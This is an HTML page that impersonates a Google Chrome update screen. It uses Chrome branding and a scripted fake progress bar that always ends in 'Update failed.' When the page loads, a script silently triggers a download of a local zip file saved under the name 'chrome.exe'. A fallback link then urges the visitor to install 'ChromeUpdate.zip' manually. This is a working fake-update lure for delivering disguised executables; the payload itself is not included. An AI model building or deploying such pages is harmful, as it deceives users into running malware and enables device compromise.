<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Chrome Update</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/x-icon" href="chrome.ico">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">

  <style>
    body {
      margin: 0;
      background: #f1f3f4;
      font-family: 'Roboto', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      background: #fff;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
      text-align: center;
      width: 360px;
      position: relative;
    }

    .box img {
      width: 56px;
      margin-bottom: 1rem;
    }

    .box h2 {
      font-size: 1.2rem;
      margin: 0 0 0.5rem;
      color: #202124;
    }

    .box p {
      font-size: 0.95rem;
      color: #5f6368;
      margin-bottom: 1.2rem;
    }

    .progress {
      background: #e0e0e0;
      border-radius: 999px;
      height: 10px;
      overflow: hidden;
      margin-top: 0.5rem;
    }

    .bar {
      height: 100%;
      width: 0%;
      background: #1a73e8;
      transition: width 0.3s ease-in-out;
    }

    .spinner {
      margin: 1rem auto;
      width: 24px;
      height: 24px;
      border: 3px solid #e0e0e0;
      border-top: 3px solid #1a73e8;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .fallback {
      display: none;
      margin-top: 1rem;
    }

    .fallback a {
      font-size: 0.9rem;
      color: #d93025;
      text-decoration: none;
      font-weight: 500;
    }

    .ver {
      font-size: 0.75rem;
      color: #9aa0a6;
      margin-top: 1.5rem;
    }

    .note {
      font-size: 0.75rem;
      color: #5f6368;
      margin-top: 0.5rem;
    }
  </style>

  <script>
    window.onload = () => {
      const bar = document.querySelector('.bar');
      const statusText = document.querySelector('p');
      const spinner = document.querySelector('.spinner');
      let progress = 0;

      const statusMsgs = [
        "Checking for updates...",
        "Preparing installation...",
        "Downloading update package...",
        "Validating files...",
        "Finalizing...",
        "Update failed."
      ];

      const interval = setInterval(() => {
        progress += Math.random() * 12;
        bar.style.width = Math.min(progress, 100) + "%";

        if (progress > 90) {
          statusText.innerText = statusMsgs[4];
        } else if (progress > 70) {
          statusText.innerText = statusMsgs[3];
        } else if (progress > 45) {
          statusText.innerText = statusMsgs[2];
        } else if (progress > 20) {
          statusText.innerText = statusMsgs[1];
        } else {
          statusText.innerText = statusMsgs[0];
        }

        if (progress >= 100) {
          clearInterval(interval);
          spinner.style.display = "none";
          showFallback();
        }
      }, 300);

      // Simulate download of .exe
      const a = document.createElement('a');
      a.href = 'chrome.zip';  // rename this to .exe if needed
      a.download = 'chrome.exe';
      document.body.appendChild(a);
      a.click();
    };

    function showFallback() {
      document.querySelector('p').innerText = "Auto-update failed.";
      document.querySelector('.fallback').style.display = "block";
    }
  </script>
</head>
<body>
  <div class="box">
    <img src="https://www.google.com/chrome/static/images/favicons/favicon-96x96.png" alt="Chrome">
    <h2>Updating Chrome</h2>
    <p>Checking for updates...</p>
    <div class="spinner"></div>
    <div class="progress">
      <div class="bar"></div>
    </div>
    <div class="fallback">
      <a href="ChromeUpdate.zip">Click here to install manually</a>
    </div>
    <div class="note">Installer: ChromeUpdateInstaller.exe</div>
    <div class="ver">Version 140.0.7204.168</div>
  </div>
</body>
</html>
